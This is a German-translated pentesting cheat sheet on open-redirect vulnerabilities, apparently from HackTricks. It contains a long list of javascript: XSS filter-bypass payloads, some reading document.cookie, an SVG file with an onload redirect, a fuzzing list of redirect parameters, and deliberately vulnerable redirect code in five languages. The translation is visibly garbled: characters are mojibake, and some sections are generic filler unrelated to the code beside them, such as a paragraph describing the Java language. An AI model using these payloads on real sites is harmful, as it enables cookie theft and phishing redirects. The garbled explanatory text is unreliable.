<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


# Offene Weiterleitung

## Weiterleitung zu localhost oder beliebigen Domains

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

## Offene Weiterleitung zu XSS
```bash
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```
# Offene Weiterleitung beim Hochladen von SVG-Dateien

Ein Open Redirect ist eine Sicherheitsl√ºcke, die es einem Angreifer erm√∂glicht, einen Benutzer von einer vertrauensw√ºrdigen Website auf eine b√∂sartige Website umzuleiten. Diese Schwachstelle tritt h√§ufig auf, wenn eine Anwendung Benutzereingaben nicht ausreichend √ºberpr√ºft und validiert.

Beim Hochladen von SVG-Dateien besteht die M√∂glichkeit, dass ein Angreifer eine Open-Redirect-Schwachstelle ausnutzt. Dies geschieht, indem der Angreifer eine SVG-Datei mit einem speziell konstruierten Link hochl√§dt, der auf eine b√∂sartige Website verweist.

Um diese Schwachstelle zu beheben, sollten Entwickler sicherstellen, dass alle Benutzereingaben ordnungsgem√§√ü validiert und bereinigt werden, insbesondere beim Hochladen von Dateien. Es ist wichtig, alle eingehenden Links zu √ºberpr√ºfen und sicherzustellen, dass sie nur auf vertrauensw√ºrdige interne Seiten verweisen.

Dar√ºber hinaus sollten Sicherheitsmechanismen wie Content Security Policy (CSP) implementiert werden, um das Risiko von Open-Redirect-Angriffen weiter zu verringern. CSP erm√∂glicht es Entwicklern, festzulegen, von welchen Quellen Ressourcen geladen werden d√ºrfen, und kann so das Risiko von Weiterleitungen auf b√∂sartige Websites reduzieren.

Es ist wichtig, dass Entwickler sich der potenziellen Risiken von Open-Redirect-Schwachstellen bewusst sind und entsprechende Sicherheitsma√ünahmen ergreifen, um ihre Anwendungen zu sch√ºtzen.
```markup
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```
# H√§ufige Injektionsparameter

In Webanwendungen gibt es bestimmte Parameter, die oft von Angreifern ausgenutzt werden, um Injektionsangriffe durchzuf√ºhren. Hier sind einige der h√§ufigsten Injektionsparameter:

- **URL-Parameter**: Dies sind die Parameter, die in der URL einer Webseite enthalten sind. Angreifer k√∂nnen versuchen, sch√§dlichen Code in diese Parameter einzuf√ºgen, um die Anwendung zu kompromittieren.
- **Formularparameter**: Wenn eine Webseite ein Formular enth√§lt, k√∂nnen Angreifer versuchen, sch√§dlichen Code in die Formularfelder einzuf√ºgen, um die Anwendung zu manipulieren.
- **Cookie-Parameter**: Cookies werden verwendet, um Informationen √ºber den Benutzer zu speichern. Angreifer k√∂nnen versuchen, sch√§dlichen Code in die Cookie-Parameter einzuf√ºgen, um die Anwendung zu beeinflussen.
- **Header-Parameter**: Header-Parameter enthalten Informationen √ºber die Anfrage oder die Antwort. Angreifer k√∂nnen versuchen, sch√§dlichen Code in diese Parameter einzuf√ºgen, um die Anwendung zu kompromittieren.
- **Datenbankparameter**: Wenn eine Anwendung eine Datenbank verwendet, k√∂nnen Angreifer versuchen, sch√§dlichen Code in die Datenbankparameter einzuf√ºgen, um auf vertrauliche Informationen zuzugreifen oder die Datenbank zu manipulieren.

Es ist wichtig, diese h√§ufigen Injektionsparameter zu kennen und geeignete Sicherheitsma√ünahmen zu ergreifen, um Injektionsangriffe zu verhindern.
```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```
```csharp
using System;
using System.Web;

namespace OpenRedirect
{
    public partial class Redirect : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            string redirectUrl = Request.QueryString["url"];
            if (!string.IsNullOrEmpty(redirectUrl))
            {
                Response.Redirect(redirectUrl);
            }
        }
    }
}
```

### Java

```java
import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class RedirectServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String redirectUrl = request.getParameter("url");
        if (redirectUrl != null && !redirectUrl.isEmpty()) {
            response.sendRedirect(redirectUrl);
        }
    }
}
```

### PHP

```php
<?php
if (isset($_GET['url'])) {
    $redirectUrl = $_GET['url'];
    header("Location: $redirectUrl");
    exit();
}
?>
```

### Python

```python
from flask import Flask, redirect, request

app = Flask(__name__)

@app.route('/redirect')
def redirect_url():
    redirect_url = request.args.get('url')
    if redirect_url:
        return redirect(redirect_url)
    else:
        return 'No redirect URL provided.'

if __name__ == '__main__':
    app.run()
```

### Ruby

```ruby
require 'sinatra'

get '/redirect' do
    redirect_url = params[:url]
    if redirect_url
        redirect redirect_url
    else
        'No redirect URL provided.'
    end
end
```
```bash
response.redirect("~/mysafe-subdomain/login.aspx")
```
### Java

Java ist eine objektorientierte Programmiersprache, die weit verbreitet ist und f√ºr die Entwicklung von plattformunabh√§ngigen Anwendungen verwendet wird. Sie wurde von Sun Microsystems entwickelt und sp√§ter von Oracle √ºbernommen. Java-Code wird in Bytecode kompiliert, der von der Java Virtual Machine (JVM) ausgef√ºhrt wird. Dies erm√∂glicht es, Java-Anwendungen auf verschiedenen Betriebssystemen auszuf√ºhren, ohne den Code neu zu schreiben.

Java bietet eine Vielzahl von Funktionen und Bibliotheken, die die Entwicklung von robusten und sicheren Anwendungen erleichtern. Es unterst√ºtzt auch die Verwendung von Threads, um parallele und nebenl√§ufige Programmierung zu erm√∂glichen. Java-Anwendungen k√∂nnen in verschiedenen Bereichen eingesetzt werden, wie z.B. Webentwicklung, mobile Anwendungen, Big Data und maschinelles Lernen.

Die Sicherheit von Java-Anwendungen ist ein wichtiger Aspekt, da sie anf√§llig f√ºr verschiedene Arten von Angriffen sein k√∂nnen. Es ist wichtig, bew√§hrte Sicherheitspraktiken zu befolgen, um potenzielle Schwachstellen zu vermeiden. Dazu geh√∂ren das Vermeiden von unsicherem Code, das Aktualisieren von Bibliotheken und Frameworks, das Implementieren von Zugriffskontrollen und das Durchf√ºhren von Penetrationstests, um potenzielle Schwachstellen zu identifizieren und zu beheben.
```bash
response.redirect("http://mysafedomain.com");
```
### PHP

#### Offene Weiterleitung (Open Redirect)

Eine offene Weiterleitung tritt auf, wenn eine Webanwendung den Benutzer auf eine andere Seite weiterleitet, ohne die Ziel-URL ordnungsgem√§√ü zu validieren. Dies kann von Angreifern ausgenutzt werden, um Benutzer auf b√∂sartige Websites umzuleiten und Phishing-Angriffe durchzuf√ºhren.

#### Ausnutzung einer offenen Weiterleitung

Um eine offene Weiterleitung auszunutzen, muss der Angreifer die URL der Webanwendung manipulieren, um eine b√∂sartige Ziel-URL einzuf√ºgen. Dies kann durch Hinzuf√ºgen von Parametern zur URL oder durch √Ñndern des Werts eines vorhandenen Parameters erfolgen.

Beispiel:

```
https://example.com/redirect.php?url=https://malicious-website.com
```

In diesem Beispiel wird der Parameter `url` verwendet, um die Ziel-URL anzugeben. Der Angreifer kann den Wert dieses Parameters √§ndern, um eine b√∂sartige Website einzuf√ºgen.

#### Auswirkungen einer offenen Weiterleitung

Die Auswirkungen einer offenen Weiterleitung k√∂nnen je nach Art des Angriffs variieren. Ein Angreifer kann die offene Weiterleitung nutzen, um Benutzer auf Phishing-Websites umzuleiten, auf denen sie vertrauliche Informationen wie Benutzernamen, Passw√∂rter oder Kreditkartendaten preisgeben k√∂nnen. Dar√ºber hinaus kann ein Angreifer die offene Weiterleitung verwenden, um b√∂sartigen Code einzuf√ºgen und die Kontrolle √ºber das System des Benutzers zu √ºbernehmen.

#### Schutzma√ünahmen

Um offene Weiterleitungen zu verhindern, sollten Webanwendungen die Ziel-URL ordnungsgem√§√ü validieren und nur auf vertrauensw√ºrdige Websites weiterleiten. Es ist wichtig, Eingaben von Benutzern zu √ºberpr√ºfen und sicherzustellen, dass sie den erwarteten Format- und Inhaltseinschr√§nkungen entsprechen.

Dar√ºber hinaus sollten Entwickler Whitelists verwenden, um die erlaubten Weiterleitungsziele einzuschr√§nken und Blacklists zu vermeiden, da diese weniger effektiv sind und leicht umgangen werden k√∂nnen.

#### Zusammenfassung

Offene Weiterleitungen sind eine Sicherheitsl√ºcke, bei der eine Webanwendung den Benutzer auf eine andere Seite weiterleitet, ohne die Ziel-URL ordnungsgem√§√ü zu validieren. Angreifer k√∂nnen diese Schwachstelle ausnutzen, um Benutzer auf b√∂sartige Websites umzuleiten und Phishing-Angriffe durchzuf√ºhren. Webanwendungen sollten die Ziel-URL ordnungsgem√§√ü validieren und nur auf vertrauensw√ºrdige Websites weiterleiten, um offene Weiterleitungen zu verhindern.
```php
<?php
/* browser redirections*/
header("Location: http://mysafedomain.com");
exit;
?>
```
# Werkzeuge

* [https://github.com/0xNanda/Oralyzer](https://github.com/0xNanda/Oralyzer)

# Ressourcen

* In [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect) finden Sie Fuzzing-Listen.
* [https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
* [https://github.com/cujanovic/Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
* [https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a](https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a)


<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
